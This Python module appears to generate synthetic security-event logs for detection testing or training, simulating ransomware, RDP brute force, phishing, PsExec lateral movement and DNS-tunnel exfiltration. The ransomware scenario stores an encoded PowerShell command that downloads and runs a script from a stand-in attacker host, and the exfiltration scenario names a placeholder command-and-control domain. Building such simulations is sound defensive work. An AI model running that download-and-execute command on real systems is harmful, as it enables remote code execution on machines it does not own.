import json
from datetime import datetime
import random

from shared.seed_data import USERS, HOSTS, lookup_user, lookup_host, users_by_department, hosts_by_department


class LogGenerator:

    @staticmethod
    def _base(event_type, technique_id, technique_name, tactic, category, action,
               severity, confidence, message, process_name="", process_path="",
               process_pid=0, parent_name="", parent_path="", target_name="",
               target_path="", target_pid=0, username="", user_domain="",
               host="", host_ip="", source_ip="", dest_ip="", dest_port=0,
               registry_path="", registry_value="", registry_data="",
               file_name="", file_path="", dns_query="", command_line=""):
        ts = str(datetime.utcnow())
        raw_fields = {
            "ts": ts,
            "event_type": event_type,
            "category": category,
            "action": action,
            "severity": severity,
            "confidence": confidence,
            "message": message,
            "threat": {
                "technique_id": technique_id,
                "technique_name": technique_name,
                "tactic": tactic
            },
        }
        if process_name:
            raw_fields["process"] = {"name": process_name}
            if process_path:
                raw_fields["process"]["path"] = process_path
            if process_pid:
                raw_fields["process"]["pid"] = str(process_pid)
            if command_line:
                raw_fields["process"]["command_line"] = command_line
        if parent_name:
            raw_fields["parent"] = {"name": parent_name}
            if parent_path:
                raw_fields["parent"]["path"] = parent_path
        if target_name:
            raw_fields["target"] = {"name": target_name}
            if target_path:
                raw_fields["target"]["path"] = target_path
            if target_pid:
                raw_fields["target"]["pid"] = str(target_pid)
        if username:
            raw_fields["user"] = {"name": username}
            if user_domain:
                raw_fields["user"]["domain"] = user_domain
        if host:
            raw_fields["host"] = {"name": host}
            if host_ip:
                raw_fields["host"]["ip"] = host_ip
        if source_ip:
            raw_fields["source"] = {"ip": source_ip}
        if dest_ip:
            raw_fields["destination"] = {"ip": dest_ip}
            if dest_port:
                raw_fields["destination"]["port"] = str(dest_port)
        if registry_path:
            raw_fields["registry"] = {"path": registry_path}
            if registry_value:
                raw_fields["registry"]["value"] = str(registry_value)
            if registry_data:
                raw_fields["registry"]["data"] = registry_data
        if file_name:
            raw_fields["file"] = {"name": file_name}
            if file_path:
                raw_fields["file"]["path"] = file_path
        if dns_query:
            raw_fields["dns"] = {"query": dns_query}

        return {
            "ts": ts,
            "event_type": event_type,
            "technique_id": technique_id,
            "technique_name": technique_name,
            "tactic": tactic,
            "category": category,
            "action": action,
            "severity": severity,
            "confidence": confidence,
            "message": message,
            "process_name": process_name,
            "process_path": process_path,
            "process_pid": process_pid,
            "parent_process_name": parent_name,
            "parent_process_path": parent_path,
            "target_process_name": target_name,
            "target_process_path": target_path,
            "target_process_pid": target_pid,
            "username": username,
            "user_domain": user_domain,
            "host": host,
            "host_ip": host_ip,
            "source_ip": source_ip,
            "dest_ip": dest_ip,
            "dest_port": dest_port,
            "registry_path": registry_path,
            "registry_value": registry_value,
            "registry_data": registry_data,
            "file_name": file_name,
            "file_path": file_path,
            "dns_query": dns_query,
            "command_line": command_line,
            "raw": json.dumps(raw_fields),
        }

    @staticmethod
    def _pick_user(dept):
        pool = users_by_department(dept)
        if not pool:
            pool = USERS
        return random.choice(pool)

    @staticmethod
    def _pick_host(dept=None):
        pool = hosts_by_department(dept) if dept else HOSTS
        if not pool:
            pool = HOSTS
        return random.choice(pool)

    @staticmethod
    def _resolve_user(dept, override_username=None):
        if override_username:
            u = lookup_user.get(override_username)
            if u:
                return dict(u)
            return {"username": override_username, "domain": "CORP", "department": dept, "role": ""}
        return dict(LogGenerator._pick_user(dept))

    @staticmethod
    def _resolve_host(dept, override_host=None, override_ip=None):
        if override_host:
            h = lookup_host.get(override_host)
            if h:
                return dict(h)
            return {"hostname": override_host, "ip": override_ip or "0.0.0.0", "department": dept, "role": ""}
        h = LogGenerator._pick_host(dept)
        if override_ip:
            h["ip"] = override_ip
        return dict(h)

    @staticmethod
    def _resolve_source_ip(host_entry, override_source_ip=None):
        if override_source_ip:
            return override_source_ip
        return host_entry.get("ip", "")

    @staticmethod
    def ransomware(override_username=None, override_host=None, override_source_ip=None):
        user = LogGenerator._resolve_user("Finance", override_username)
        host_entry = LogGenerator._resolve_host("Finance", override_host, override_source_ip)
        src = LogGenerator._resolve_source_ip(host_entry, override_source_ip)
        return [
            LogGenerator._base(
                event_type="impact", technique_id="T1486",
                technique_name="Data Encrypted for Impact",
                tactic="Impact", category="process", action="file_encryption",
                severity=70, confidence=85,
                message=f"Microsoft Word opened malicious document on {host_entry['hostname']} — potential ransomware dropper",
                process_name="winword.exe", process_path="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                parent_name="explorer.exe", parent_path="C:\\Windows\\explorer.exe",
                username=user["username"], user_domain=user["domain"],
                host=host_entry["hostname"], host_ip=host_entry["ip"],
                source_ip=src,
            ),
            LogGenerator._base(
                event_type="execution", technique_id="T1059.001",
                technique_name="PowerShell",
                tactic="Execution", category="process", action="process_start",
                severity=85, confidence=90,
                message="PowerShell encoded command execution — possible ransomware staging",
                process_name="powershell.exe", process_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                command_line="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAEUAVAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                parent_name="winword.exe", parent_path="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                username=user["username"], user_domain=user["domain"],
                host=host_entry["hostname"], host_ip=host_entry["ip"],
                source_ip=src,
            ),
            LogGenerator._base(
                event_type="impact", technique_id="T1486",
                technique_name="Data Encrypted for Impact",
                tactic="Impact", category="file", action="file_modified",
                severity=95, confidence=98,
                message="Mass file extension change detected — ransom note created",
                file_name="invoice_data.locked", file_path=f"C:\\Users\\{user['username']}\\Documents\\invoice_data.locked",
                username=user["username"], user_domain=user["domain"],
                host=host_entry["hostname"], host_ip=host_entry["ip"],
                source_ip=src,
            ),
        ]

    @staticmethod
    def brute_force(override_username=None, override_host=None, override_source_ip=None):
        target_host = LogGenerator._resolve_host("IT", override_host or "DC-01", override_source_ip)
        user = LogGenerator._resolve_user("IT", override_username)
        logs = []
        for i in range(10):
            src_ip = LogGenerator._resolve_source_ip(target_host, override_source_ip)
            if not override_source_ip:
                src_ip = f"192.168.1.{random.randint(10,200)}"
            logs.append(LogGenerator._base(
                event_type="failed_login", technique_id="T1110",
                technique_name="Brute Force",
                tactic="Credential Access", category="authentication", action="login_failed",
                severity=70, confidence=85,
                message=f"RDP authentication failure from {src_ip} → {target_host['hostname']} — possible brute force",
                username=user["username"], user_domain=user["domain"],
                host=target_host["hostname"], host_ip=target_host["ip"],
                source_ip=src_ip, dest_ip=target_host["ip"], dest_port=3389,
            ))
        return logs

    @staticmethod
    def phishing(override_username=None, override_host=None, override_source_ip=None):
        user = LogGenerator._resolve_user("Executive", override_username)
        host_entry = LogGenerator._resolve_host("Executive", override_host, override_source_ip)
        src = LogGenerator._resolve_source_ip(host_entry, override_source_ip)
        return [
            LogGenerator._base(
                event_type="execution", technique_id="T1566",
                technique_name="Phishing",
                tactic="Initial Access", category="process", action="url_click",
                severity=75, confidence=80,
                message=f"User {user['username']} clicked malicious phishing link via Outlook Web Access",
                process_name="outlook.exe", process_path="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                username=user["username"], user_domain=user["domain"],
                host=host_entry["hostname"], host_ip=host_entry["ip"],
                source_ip=src, dest_ip="185.220.101.20", dest_port=443,
            ),
        ]

    @staticmethod
    def lateral_movement(override_username=None, override_host=None, override_source_ip=None):
        source_host = LogGenerator._resolve_host("Engineering", override_host, override_source_ip)
        target_host = LogGenerator._resolve_host("IT")
        user = LogGenerator._resolve_user("IT", override_username)
        src = LogGenerator._resolve_source_ip(source_host, override_source_ip)
        return [
            LogGenerator._base(
                event_type="lateral_movement", technique_id="T1021.002",
                technique_name="SMB Admin Share Access",
                tactic="Lateral Movement", category="network", action="smb_share_access",
                severity=85, confidence=88,
                message=f"PsExec service remote execution detected from {source_host['hostname']} → {target_host['hostname']}",
                process_name="PSEXESVC.exe", process_path="C:\\Windows\\PSEXESVC.exe",
                username=user["username"], user_domain=user["domain"],
                host=target_host["hostname"], host_ip=target_host["ip"],
                source_ip=src, dest_ip=target_host["ip"], dest_port=445,
            ),
        ]

    @staticmethod
    def exfiltration(override_username=None, override_host=None, override_source_ip=None):
        user = LogGenerator._resolve_user("Finance", override_username)
        host_entry = LogGenerator._resolve_host("Finance", override_host, override_source_ip)
        src = LogGenerator._resolve_source_ip(host_entry, override_source_ip)
        return [
            LogGenerator._base(
                event_type="exfiltration", technique_id="T1048.003",
                technique_name="Exfiltration Over Alternative Protocol",
                tactic="Exfiltration", category="network", action="data_transfer",
                severity=95, confidence=92,
                message=f"Large outbound data transfer from {host_entry['hostname']} to external IP via DNS tunneling",
                username=user["username"], user_domain=user["domain"],
                host=host_entry["hostname"], host_ip=host_entry["ip"],
                source_ip=src, dest_ip="185.220.101.45", dest_port=53,
                dns_query="encoded-data.evil-c2.com",
            ),
        ]
